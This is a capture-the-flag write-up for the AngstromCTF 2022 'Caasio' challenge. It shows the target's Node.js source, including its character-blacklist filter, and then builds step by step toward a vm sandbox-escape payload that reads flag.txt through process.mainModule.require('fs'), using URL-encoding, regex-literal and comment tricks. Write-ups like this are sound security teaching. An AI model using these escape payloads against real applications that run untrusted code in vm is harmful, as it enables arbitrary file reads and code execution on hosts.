---
title: AngstromCTF 2022 - Caasio
description: Omstrang 2022
summary: ZUTOMAYO
cover: ./cover.png
published: '2022-05-06T20:00:00.000+07:00'
updated: '2022-05-06T20:00:00.000+07:00'
toc: false
tags:
  - [ ctf ]
---

# Description
This is a challenge about _escape js vm_ in AnstromCTF 2022.

# Solution

Read out the description and we'll know that we have to escape something _**jsjails**_, let's connect to the _**nc**_ !

![image](https://user-images.githubusercontent.com/75429369/169534898-d96539eb-e365-4290-82be-63e288d63ec5.png)

We can figure out that the program will wait the user to input a calculation and then it will give the result.
At this point, we've already known what we have to do is escape the js vm, after researching for solution, previous write up, .... I've made a payload and test it out:

![image](https://user-images.githubusercontent.com/75429369/169539477-568f9572-9e53-4860-9007-e9f633f06ded.png)

Hmmm, it's not like the first test when we only gave it a calculation, maybe the program has blocked some characters. Let's read the source:

```js
#!/usr/local/bin/node

// flag in ./flag.txt

const vm = require("vm");
const readline = require("readline");

const interface = readline.createInterface({
    input: process.stdin,
    output: process.stdout,
});

interface.question(
    "Welcome to CaaSio: Please Stop Edition! Enter your calculation:\n",
    function (input) {
        interface.close();
        if (
            input.length < 215 &&
            /^[\x20-\x7e]+$/.test(input) &&
            !/[.\[\]{}\s;`'"\\_<>?:]/.test(input) &&
            !input.toLowerCase().includes("import")
        ) {
            try {
                const val = vm.runInNewContext(input, {});
                console.log("Result:");
                console.log(val);
                console.log(
                    "See, isn't the calculator so much nicer when you're not trying to hack it?"
                );
            } catch (e) {
                console.log("your tried");
            }
        } else {
            console.log(
                "Third time really is the charm! I've finally created an unhackable system!"
            );
        }
    }
);
```

Like I said, it has blacklist filtered some characters such as: dot, brackets, backslash, underscore, greater,...

Looks like it has filtered all the special characters but no, the percent "%" hasn't. So we can easily bypass this regex by using urlencode, remember to put the payload into _**decodeURIComponent**_ and wrap it into _**eval**_ to evaluate:

```js
eval(decodeURIComponent(this%2Econstructor%2Econstructor(%22return%20this%2Eprocess%2EmainModule%2Erequire(%27fs%27)%2EreadFileSync(%27flag%2Etxt%27)%22)()))
```

![image](https://user-images.githubusercontent.com/75429369/169539910-cbec5b74-8ac9-4d92-ab8d-4e5da2211feb.png)

I've thought this is it but it didn't... Maybe something wrong with the string that made the command didn't work.

I was in the deadlock for like 4-5 hours until I read the source again and realised that the forward slash "/" hasn't filtered. We can use it as a regex to convert it into a string, just add "/" at the start and the end of the payload:

```js
eval(decodeURIComponent(/this%2Econstructor%2Econstructor(%22return%20this%2Eprocess%2EmainModule%2Erequire(%27fs%27)%2EreadFileSync(%27flag%2Etxt%27)%22)()/))
```
![image](https://user-images.githubusercontent.com/75429369/169540893-a87ab025-ee63-424b-9dd2-81ee1460c895.png)

WHAT, it didn't work but at least we have a little sparkle. It done parsed the regex into string, but it didn't evaluate because it wasn't a valid expression. 

Now let me do a trick, I just add another forward slashes at the first and the end of the payload again to comment it out, then use a line break to seperate the command, so we'll have our payload worked like a charm:

```js
eval(decodeURIComponent(/%2F%0Athis%2Econstructor%2Econstructor(%22return%20this%2Eprocess%2EmainModule%2Erequire(%27fs%27)%2EreadFileSync(%27flag%2Etxt%27)%22)()%2F/))
```

It'll become this:

```js
eval(// commented so not evaled
this.constructor.constructor("return this.process.mainModule.require('fs').readFileSync('flag.txt')")() //) commented so not evaled
```
![image](https://user-images.githubusercontent.com/75429369/169543579-e158e4a9-7f6c-42aa-8244-71ba0e584980.png)

Take the buffer and decode by hex and we'll get the flag yay

```
actf{omg_js_is_like_so_quirky_haha}
```
Nice challenge after all.

Thank you for reading !!!